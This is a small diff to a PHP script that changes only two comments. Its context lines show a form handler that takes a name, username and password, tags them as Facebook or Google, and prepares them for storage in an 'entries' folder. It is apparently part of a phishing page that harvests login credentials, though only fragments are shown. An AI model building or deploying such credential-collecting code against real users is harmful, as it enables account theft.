@@ -1,6 +1,6 @@
 <?php 
 
-# reload original input site if not data was entered
+# reload original input site if no data was entered
 if (!isset($_POST["name"])) {
     include "index.html";
     die;
@@ -21,7 +21,7 @@ $site = "facebook";
 if (isset($_POST["google"])) $site="google";
 $data = $site . ":" . $user . ":" . $pass;
 
-*/
+... it is just here for completeness. */
 
 $all = glob(__dir__ . "/entries/*");
 $num = count($all);
